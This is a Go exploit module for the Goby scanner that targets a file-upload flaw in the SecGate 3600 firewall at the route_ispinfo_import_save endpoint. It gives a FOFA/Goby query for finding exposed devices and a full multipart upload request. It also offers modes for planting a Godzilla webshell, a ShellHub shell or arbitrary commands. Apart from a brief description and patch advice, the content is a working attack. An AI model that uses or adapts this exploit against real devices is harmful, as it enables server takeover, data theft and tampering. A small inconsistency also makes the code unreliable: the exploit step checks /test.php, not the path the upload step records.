package exploits

import (
  "git.gobies.org/goby/goscanner/goutils"
)

func init() {
  expJson := `{
    "Name": "NetSh SecGate 3600 Firewall /?g=route_ispinfo_import_save File Upload Vulnerability",
    "Description": "<p>NetSh SecGate 3600 Firewall has a file upload vulnerability that allows attackers to upload malicious files and gain control of the server, potentially leading to sensitive information leakage, data tampering, and complete server compromise.</p>",
    "Product": "NetSh SecGate 3600 Firewall",
    "Homepage": "https://www.nsfocus.com/",
    "DisclosureDate": "2024-02-06",
    "PostTime": "2024-12-04",
    "Author": "2826161446@qq.com",
    "FofaQuery": "title=\"网神SecGate 3600防火墙\" && body=\"网神SecGate 3600防火墙\" || body=\"./images/lsec/login/loading.gif\" ",
    "GobyQuery": "title=\"网神SecGate 3600防火墙\" && body=\"网神SecGate 3600防火墙\" || body=\"./images/lsec/login/loading.gif\" ",
    "Level": "3",
    "Impact": "<p>This vulnerability allows attackers to upload malicious files and execute arbitrary code on the server, potentially leading to complete server compromise, sensitive information leakage, and system crashes.</p>",
    "Recommendation": "<p>It is recommended to contact the vendor and apply the official patch to fix the vulnerability. Additionally, configure access policies through security devices such as firewalls, enable whitelist access, and prohibit unnecessary public network access.</p>",
    "References": [
        "https://axsec.blog.csdn.net/article/details/136064367?spm=1001.2014.3001.5502"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "Mode",
            "type": "select",
            "value": "ShellHub,Godzilla,Command,Customize",
            "show": ""
        },
        {
            "name": "Command",
            "type": "input",
            "value": "whoami",
            "show": "Mode=Command"
        },
        {
            "name": "Content",
            "type": "input",
            "value": "input your content",
            "show": "Mode=Customize"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "POST",
                "uri": "/?g=route_ispinfo_import_save",
                "follow_redirect": false,
                "header": {
                    "Accept": "*/*",
                    "Accept-Encoding": "gzip, deflate",
                    "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryJpMyThWnAxbcBBQc"
                },
                "data_type": "text",
                "data": "------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"MAX_FILE_SIZE\"\r\n\r\n10000000\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"reqfile\"; filename=\"{{{FILENAME}}}\"\r\nContent-Type: text/plain\r\n\r\n{{{CONTENT}}}\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc\r\nContent-Disposition: form-data; name=\"submit_post\"\r\n\r\nroute_ispinfo_import_save\r\n------WebKitFormBoundaryJpMyThWnAxbcBBQc--"
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "302",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "FILE_PATH|define|variable|/attachements/{{{FILENAME}}}"
            ]
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "6.7",
    "Translation": {
        "CN": {
            "Name": "网神 SecGate 3600 防火墙 /?g=route_ispinfo_import_save 文件上传漏洞",
            "Product": "网神 SecGate 3600 防火墙",
            "Description": "<p>网神 SecGate 3600 防火墙存在文件上传漏洞，攻击者可以通过上传恶意文件获取服务器控制权限，可能导致敏感信息泄露、数据篡改以及服务器被完全控制。</p>",
            "Recommendation": "<p>建议用户联系厂商并应用官方提供的补丁修复漏洞。同时，通过防火墙等安全设备设置访问策略，启用白名单访问，禁止非必要的公网访问。</p>",
            "Impact": "<p>该漏洞允许攻击者上传恶意文件并在服务器上执行任意代码，可能导致服务器被完全控制、敏感信息泄露以及系统崩溃等严重后果。</p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "NetSh SecGate 3600 Firewall /?g=route_ispinfo_import_save File Upload Vulnerability",
            "Product": "NetSh SecGate 3600 Firewall",
            "Description": "<p>NetSh SecGate 3600 Firewall has a file upload vulnerability that allows attackers to upload malicious files and gain control of the server, potentially leading to sensitive information leakage, data tampering, and complete server compromise.</p>",
            "Recommendation": "<p>It is recommended to contact the vendor and apply the official patch to fix the vulnerability. Additionally, configure access policies through security devices such as firewalls, enable whitelist access, and prohibit unnecessary public network access.</p>",
            "Impact": "<p>This vulnerability allows attackers to upload malicious files and execute arbitrary code on the server, potentially leading to complete server compromise, sensitive information leakage, and system crashes.</p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": [
            "NetSh SecGate 3600 Firewall"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {
        "TEMPLATE": "define|variable|FileUpload",
        "SCRIPT_TYPE": "define|variable|php",
        "VUL_URL": "define|variable|/?g=route_ispinfo_import_save"
    },
    "VariablesOrder": [
        "TEMPLATE",
        "SCRIPT_TYPE",
        "VUL_URL"
    ],
    "EditType": "fast",
    "PocId": "9975"
}`

  ExpManager.AddExploit(NewExploit(
    goutils.GetFileName(),
    expJson,
    nil,
    nil,
  ))
}